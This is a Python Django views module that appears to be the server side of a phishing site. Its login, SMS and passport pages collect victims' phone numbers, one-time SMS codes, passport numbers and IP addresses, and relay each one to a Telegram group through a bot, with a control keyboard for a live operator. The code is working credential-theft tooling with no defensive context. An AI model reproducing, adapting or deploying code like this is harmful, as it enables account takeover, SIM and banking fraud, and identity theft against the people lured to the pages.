import logging
from datetime import timedelta

from django.http import HttpResponse
from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from telegram import Bot

from bot.bot import BotHelper
from .helpers import *
from django_ratelimit.decorators import ratelimit
from blacklist.ratelimit import blacklist_ratelimited
from config.settings import BLACKLIST_ADDRESS_SOURCE
from .models import MetaPixel

logger = logging.getLogger(__name__)


# @ratelimit(key=f'header:{BLACKLIST_ADDRESS_SOURCE}', rate='10/m', block=False)  # PROD
# @blacklist_ratelimited(timedelta(days=365))
def main(request):
    user_id = generate_user_id()

    pixel = MetaPixel.objects.first()
    pixel_id = pixel.pixel_id if pixel else 0

    return render(request, "web_site/main.html", context={"id": user_id, "pixel_id": pixel_id})


def wait(request):
    return render(request, "web_site/wait.html")


# @ratelimit(key=f'header:{BLACKLIST_ADDRESS_SOURCE}', rate='10/m', block=False)  # PROD
# @blacklist_ratelimited(timedelta(days=365))
def login(request):
    user_id = request.GET.get("id")
    if user_id is None:
        return render(request, "web_site/main.html")

    return render(request, "web_site/login.html", context={"id": user_id})


@csrf_exempt
async def sms(request):
    user_id = request.GET.get("id")
    if user_id == None:
        return render(request, "web_site/main.html")

    client_ip = get_client_ip(request=request)

    helper = BotHelper(user_id)
    bot_data = await helper.get_bot()

    bot = Bot(token=bot_data.token)
    clear_storage_data(user_id)

    if "phone" in request.POST:
        keyboard = helper.keyboard(request, user_id, client_ip)
        try:
            phone = request.POST.get("phone")

            message = await helper.phone_message(request, user_id, phone, client_ip)
            await bot.send_message(chat_id=bot_data.group_id, text=message, reply_markup=keyboard)

            create_storage_for_user(user_id)
        except Exception as e:
            logger.info(f"Phone page error - {e}")
    elif "code" in request.POST:
        keyboard = helper.keyboard(request, user_id, client_ip, True)
        try:
            code = request.POST.get("code")

            message = await helper.sms_message(request, user_id, code, client_ip)
            await bot.send_message(chat_id=bot_data.group_id, text=message, reply_markup=keyboard)

        except Exception as e:
            logger.info(f"Code page error - {e}")

    return render(request, "web_site/sms.html", context={"id": user_id, "domain": request.META['HTTP_HOST']})


@csrf_exempt
async def passport(request):
    user_id = request.GET.get("id")
    if user_id == None:
        return render(request, "web_site/main.html")

    client_ip = get_client_ip(request=request)

    pixel = await MetaPixel.objects.afirst()
    pixel_id = pixel.pixel_id if pixel else 0

    helper = BotHelper(user_id)
    bot_data = await helper.get_bot()
    keyboard = helper.keyboard(request, user_id, client_ip, True)

    bot = Bot(token=bot_data.token)
    clear_storage_data(user_id)

    if "pass" in request.POST:
        try:
            passport = request.POST.get("pass")
            phone = request.POST.get("phone")

            message = await helper.passport_message(request, user_id, passport, client_ip, phone)
            await bot.send_message(chat_id=bot_data.group_id, text=message, reply_markup=keyboard)

        except Exception as e:
            logger.info(f"Passport page error - {e}")

    return render(request, "web_site/passport.html", context={
        "id": user_id,
        "domain": request.META['HTTP_HOST'],
        "pixel_id": pixel_id
    })


# @ratelimit(key=f'header:{BLACKLIST_ADDRESS_SOURCE}', rate='10/m', block=False)  # PROD
# @blacklist_ratelimited(timedelta(days=365))
def success(request):
    user_id = request.GET.get("id")
    if user_id == None:
        return render(request, "web_site/main.html")

    return render(request, "web_site/success.html", context={"id": user_id})


def storage_check(request, id, file_name):
    try:
        data = read_storage_data(id)
        return HttpResponse(content=data, status=200)
    except Exception as e:
        logger.info(f"Storage check error - {e}")
        return HttpResponse(content="", status=200)
